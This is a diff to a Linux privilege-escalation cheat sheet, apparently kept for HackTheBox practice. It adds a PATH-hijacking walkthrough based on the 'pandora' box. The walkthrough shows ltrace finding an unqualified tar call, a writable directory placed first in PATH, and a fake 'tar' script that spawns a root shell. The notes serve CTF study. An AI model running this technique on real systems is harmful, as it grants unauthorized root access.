@@ -14,6 +14,7 @@ Everything to check when trying to become root
     - Check [this](https://linux.die.net/man/8/blkid) link for more.
 - `cat /sys/class/graphics/fb0/virtual_size` --> Shows the screen resolution.
 - [`debugfs`](./linux.md#debugfs)
+- `ltrace`
 
 
 # Directories
@@ -22,9 +23,10 @@ Everything to check when trying to become root
 - /tmp
 - /dev/shm
 - /opt
-- /var *and all within*
+- /var
 - /usr
-- /usr/local
+- /etc/apache2 *(if a site is live)*
+    - /etc/apache2/site-enabled
 
 
 # Tools
@@ -105,3 +107,44 @@ With this, one can read files owned by a given user
 
 ### Help
 - [https://man7.org/linux/man-pages/man8/debugfs.8.html](https://man7.org/linux/man-pages/man8/debugfs.8.html)
+
+# Path hijacking and ltrace
+If there's a program that can be run by the user but is owned by root check for the following:    
+
+Run the program with `ltrace` see if something fails, or if it's trying to access files which the user has no access to.
+
+If the program opens a file based on the `PATH` environment variable, check if it can be modified.
+If it can be, move into a directory which the user can operate under and add it to `$PATH`
+
+## Example (from pandora HTB)
+This example can be modified and used for other cases.
+
+- Find the vulnerability
+    ```bash
+    # Run program with ltrace
+    ltrace program
+
+    ## Look for permission errors
+    ### No access to /root/file
+    system("tar -cvf /root/file"...tar: /root/file.tar.gz: Cannot open: Permission denied
+    ```
+    `system` calls tar without full path, therefore it will use PATH to look for valid files.
+
+- Find a good directory and edit $PATH
+    ```bash
+    export PATH=<DIR>:$PATH
+    ```
+
+- Add file 
+    ```bash
+    # Make tar file in <DIR> folder specified above
+    vim tar
+
+    # In vim
+
+    #!/bin/bash
+    bash
+    ```
+Once the original program executes in the directory, it will run our tar program and spawn a root shell.
+
+
